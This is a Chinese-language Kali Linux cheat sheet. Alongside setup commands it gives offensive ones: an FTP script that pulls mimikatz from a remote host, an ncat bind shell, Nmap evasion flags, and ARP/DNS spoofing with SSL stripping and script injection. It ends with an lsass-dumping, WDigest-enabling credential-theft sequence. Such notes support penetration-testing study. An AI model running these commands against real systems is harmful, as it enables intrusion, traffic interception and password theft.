# Kali

## 更新升级

```
apt-get update                //更新软件包列表库
apt-get upgrade               //更新安装的软件包
apt-get dist-upgrade          //根据依赖关系更新
apt-get clean                 //清除缓存索引
reboot                        //重启电脑
```

## Kali 网络问题

```
service network-manager stop
rm /var/lib/NetworkManager/NetworkManager.state
service network-manager start
```

## SSH

```
service ssh start/restart/stop        #开启/重启/停止ssh服务
update-rc.d ssh enable/disabled       #开启/关闭ssh服务开机自启动
leafpad /etc/ssh/sshd_config          #配置SSH
---------------------------------------------
PasswordAuthentication yes
permitrootlogin  yes
```

## Apache

```
service apache2 start/restart/stop    #开启/重启/停止Apache服务
/var/www/html                         #网站存放路径
```

## ftp

```
service vsftpd start/restart/stop     #开启/重启/停止ftp服务
/home/ftp                             #文件存放路径
------------------------------------
echo open 192.168.253.130 21>ftp.txt
echo ftp>>ftp.txt
echo 123456>>ftp.txt
echo bin>>ftp.txt
echo get mimikatz.exe>>ftp.txt
echo bye>>ftp.txt
------------------------------------
ftp -s:ftp.txt
```

## nc

```
-h     //显示帮助选项
-l     //绑定并监听传入连接
-p     //指定要使用的端口
-c     //通过/bin/sh 执行给定的命令
-e     //连接后执行程序
-q     //执行完毕X秒后退出
-n     //数字ip,不通过DNS解析
-v     //显示详细信息
-u     //使用UDP模式
-z     //使用扫描模式
------------------------------------
A：nc -lp 端口 | 解密方式 > 文件
B：加密方式 < a.mp4 | nc -nv IP地址 端口 -q 时间
```

## ncat

```
--allow         //只允许给定的主机连接到 ncat
--ssl           //使用 SSL 连接或监听
--keep-open     //在断开连接时保持侦听打开
-------------------------------------
A：ncat -c bash/cmd --allow IP 地址 -vnl 端口 --ssl
B：ncat -nv IP 地址 端口 --ssl
```

## Nmap

- 主机发现:

```
-sn                             //仅进行ping扫描,不进行端口扫描
-Pn                             //跳过目标存活判断,直接进行进一步的探测
-PS/PA/PU/PY[portlist]          //使用TCP SYN/ACK,UDP,SCTP INIT方式进行发现
-n/-R                           //-n表示不进行DNS解析,-R表示总是进行DNS解析
--dns-servers <serv>            //指定DNS服务器
--system-dns                    //指定使用系统的DNS服务器
```

- 端口扫描

```
-F                              //快速扫描
-sS/sT/sA/sW/sM                 //使用TCP SYN/Connect()/ACK/Window/Maimon 扫描方式
-sU                             //使用UDP扫描方式确定目标主机的UDP端口状况
-sN/sF/sX                       //使用TCP Null/FIN/Xmas秘密扫描方式来协助探测对方的TCP端口状态
-sI <僵尸机:port>                //使用idle scan方式来扫描目标主机
```

- 版本侦测

```
-sV                              //服务版本探测
--version-intensity <level>      //指定版本侦测强度(0-9),默认为7
--version-trace                  //显示出详细的版本侦测过程信息
```

- 操作系统侦测

```
-O                               //启用操作系统检测
-A                               //同时启用操作系统检测和版本扫描
--osscan-guess/fuzzy             //推测操作系统检测结果
```

- 防火墙/IDS 规避

```
-f/--mtu <val>                   //指定使用分片、指定数据包的MTU
-D <ip1,ip2,...,ME>              //用一组IP地址掩盖真实地址,ME代表本机IP地址
-S <IP>                          //伪装成其他IP地址
-g/--source-port <port>          //使用指定源端口
--data-length <num>              //填充随机数据让数据包长度达到Num
--ttl <val>                      //设置time-to-live时间
```

## Nessus

```
service nessusd start/stop          #开启/停止Nessus
https://192.168.253.130:8834/       #网站地址(可变)
```

## Hydra

```

```

## Medusa

```
-h [TEXT]                       //目标主机名或IP地址
-H [file]                       //包含目标主机名或IP地址的文件
-u [TEXT]                       //指定用户名
-U [file]                       //包含用户名的文件
-p [TEXT]                       //指定密码
-P [file]                       //包含密码的文件
-e [n/s/ns]                     //附加密码检查
-M [text]                       //要执行的模块
-t [NUM]                        //要同时测试的登录总数
-T [NUM]                        //要同时测试的主机总数
-f                              //发现第一个有效的用户名/密码后，停止扫描主机
-F                              //在任何主机上找到第一个有效的用户名/密码后停止审计
-n [num]                        //使用非默认的TCP端口号
-s                              //启用SSL
-v <0-6>                        //显示详细信息
```

## ARP

```
echo 1 > /proc/sys/net/ipv4/ip_forward            //路由转发
arpspoof -i eth0 -t 192.168.0.144 192.168.0.1     //arp欺骗
driftnet -i eth0                                  //图片嗅探
```

## Bettercap

开启本地(远程)的 WebUI -------→ bettercap -caplet http(s)-ui

```
net.show          //展示网络情况
net.probe         //主动探测
arp.spoof         //ARP欺骗
http.proxy        //http代理
net.sniff         //开启嗅探
dns.spoof         //DNS欺骗
---------------------------------------------------------------
set arp.spoof.targets 192.168.1.1         //设置欺骗的IP目标
set http.proxy.sslstrip true              //将HTTPS降级到HTTP
set http.proxy.script /root/xss.js        //代理执行的脚本
set net.sniff.verbose false               //精简化显示数据
set dns.spoof.domains google.com          //设置要欺骗的域名
set dns.spoof.address desired_IP          //设置要重定向的地址
set dns.spoof.all true                    //回应任何请求(默认只会回应那些对本地的请求)
```

## window-informationCollection

- laZagne
- mimikatz
  e4ff9b493ebbdc0b9da5f0617b1f3cde

```
privilege::debug
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords full
------------------------------------------------------------------------------------------------------------------
#修改注册表开启/关闭Wdigest Auth
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
rundll32 user32.dll,LockWorkStation                         #强制锁屏,使其重新登录
procdump.exe -accepteula -ma lsass.exe lsass.dmp            #导出内存文件lsass.dmp
```
